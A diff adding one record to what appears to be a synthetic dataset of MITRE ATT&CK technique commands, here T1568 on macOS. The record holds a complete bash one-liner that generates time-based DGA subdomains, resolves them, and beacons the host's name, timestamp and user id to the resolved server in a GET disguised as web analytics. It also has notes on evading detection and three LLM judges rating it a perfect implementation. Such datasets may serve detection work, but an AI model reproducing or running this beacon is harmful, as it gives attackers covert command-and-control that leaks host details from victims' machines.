@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "for i in 0 1 2; do sub=$(echo -n \"$(date -u +%Y%m%d%H)$i\" | md5 -q | cut -c1-8); d=\"$sub.analytics-cdn-cache.com\"; ip=$(dig +short A \"$d\" | head -1); if [ -n \"$ip\" ]; then ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; q=$(echo -n \"$(hostname),$(date -u +%s)\" | /usr/bin/base64); wget -q --header=\"Host: $d\" --user-agent=\"$ua\" --header=\"Accept: image/webp,image/apng,image/*,*/*;q=0.8\" \"http://$ip/collect?v=1&t=pageview&cid=$(id -u)&dp=/home&dt=Welcome&z=$q\" -O /dev/null && break; fi; sleep 2; done",
+  "explanation": "Cycles through multiple DGA subdomains and signals via an analytics-like endpoint over HTTP with base64-encoded beacon data, blending into common web telemetry patterns.",
+  "rationale_steps": [
+    "Compute several DGA candidates and resolve each at runtime.",
+    "Pick the first responsive IP and craft a benign-looking analytics GET.",
+    "Use delay between attempts to avoid traffic bursts and detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-a239033e",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for a bash shell on macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using a deterministic algorithm (MD5 hash of date+counter) to generate subdomains, performs DNS resolution, and establishes command and control through HTTP beacons with encoded system information.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:54:07.522953Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid bash syntax, balanced quotes, correct command substitutions, and standard flags for all utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by implementing a Domain Generation Algorithm (DGA) for dynamic resolution, using common macOS utilities, and sending beacon-like data via HTTP, closely mimicking the T1568 technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:54:19.206682Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash loop with balanced quoting, valid flags, and correct command separators and expansions.",
+        "semantic_score": 5,
+        "semantic_justification": "Uses a time-based DGA to generate multiple subdomains, resolves them, and beacons over HTTP to the resolved IP with a matching Host header and telemetry-like parameters, aligning with T1568 dynamic resolution.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:54:37.871535Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
